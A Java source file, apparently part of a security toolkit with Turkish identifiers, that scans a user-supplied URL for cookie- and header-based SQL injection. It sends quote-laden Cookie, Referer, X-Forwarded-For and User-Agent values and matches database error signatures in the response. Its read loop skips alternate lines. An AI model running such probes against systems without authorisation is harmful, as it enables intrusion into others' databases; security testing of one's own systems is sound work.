package org.example.cloning_project_toolkit;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URLConnection;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class CookieInjection {

    public static void start() throws Exception {

        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target URL: ");
        String hedef = scanner.nextLine();

        //Thread thread = new cookie_islemleri();

        Thread thread = new cookie_islemleri(hedef);
        thread.start();

    }

}
class cookie_islemleri extends Thread {

    String hedef;

    public cookie_islemleri(String hedef) {
        this.hedef = hedef;
    }

    @Override
    public void run() {
        try {
            String cookiedeger =cookieal();
            String source = cookieyiyolla(cookiedeger);
            String inj = injectionvarmi(source);

            if (inj.contains("varrrr")) {
                System.out.println("cookieden bug var");
            }else
            {
                System.out.println("cookiede bug yok");
            }


        } catch (Exception ex) {
            Logger.getLogger(cookie_islemleri.class.getName()).log(Level.SEVERE, null, ex);
        }

    }
    private String injectionvarmi(String kaynak) throws Exception {

        String[] hatalar = new String[15];
        StringBuilder cevaplar = new StringBuilder();
        String sonuc="";

        hatalar[0]="SQL syntax.*MySQL";
        hatalar[1]="Warning.*mysql_.*";
        hatalar[2]="valid MySQL result";
        hatalar[3]="Driver.* SQL*Server";
        hatalar[4]="OLE DB.* SQL Server";
        hatalar[5]="SQL Server.*Driver";
        hatalar[6]="Warning.*mssql_.*";
        hatalar[7]="Microsoft Access Driver";
        hatalar[8]="JET Database Engine";
        hatalar[9]="Access Database Engine";
        hatalar[10]="ORA-[0-9][0-9][0-9][0-9]";
        hatalar[11]="Oracle error";
        hatalar[12]="Oracle.*Driver";
        hatalar[13]="System.Data.SQLite.SQLiteException";
        hatalar[14]="Warning.*sqlite_.*";

        for (int i = 0; i < hatalar.length; i++) {
            Pattern desen = Pattern.compile(hatalar[i]);
            Matcher regexsonuc = desen.matcher(kaynak);
            if (regexsonuc.find()) {
                sonuc="Cookie SQL injection varrrr ,hata no :"+hatalar[i];
                cevaplar.append(sonuc);
            }
            else
            {
                sonuc="Cookie SQL injection yokkkk ,hata no :"+hatalar[i];
                cevaplar.append(sonuc);
            }
        }

        return cevaplar.toString();

    }


    private String cookieal() throws Exception {
        String headerad;
        StringBuilder donencookie = new StringBuilder();

        URL url = new URL(hedef);
        URLConnection baglanti = url.openConnection();
        int i = 0;
        while ((headerad = baglanti.getHeaderFieldKey(++i)) != null)
        {
            headerad = baglanti.getHeaderFieldKey(i);
            if (headerad != null && headerad.equalsIgnoreCase("Set-Cookie"))
            {
                donencookie.append("; " + baglanti.getHeaderField(i));
            }
        }

        donencookie.delete(0, 2);

        return donencookie.toString();
    }

    private String cookieyiyolla(String cookie) throws Exception {

        String kaynak="";
        URL adres = new URL(hedef);
        HttpURLConnection baglanti = (HttpURLConnection) adres.openConnection();
        baglanti.setRequestMethod("GET");
        baglanti.setRequestProperty("X-Forwarded-For", "0x94.blogspot.com'");
        baglanti.setRequestProperty("Referer", "http://0x94.blogspot.com'");
        baglanti.setRequestProperty("User-Agent", "Linux Opera'");
        baglanti.setRequestProperty("Cookie",cookie.replace(";", "';"));
        baglanti.setReadTimeout(15*1000);
        baglanti.connect();
        BufferedReader satirlar = new BufferedReader(
                new InputStreamReader(
                        baglanti.getInputStream()));
        while (satirlar.readLine() != null)
            kaynak = kaynak.concat(satirlar.readLine()+"");
        return kaynak;
    }

}

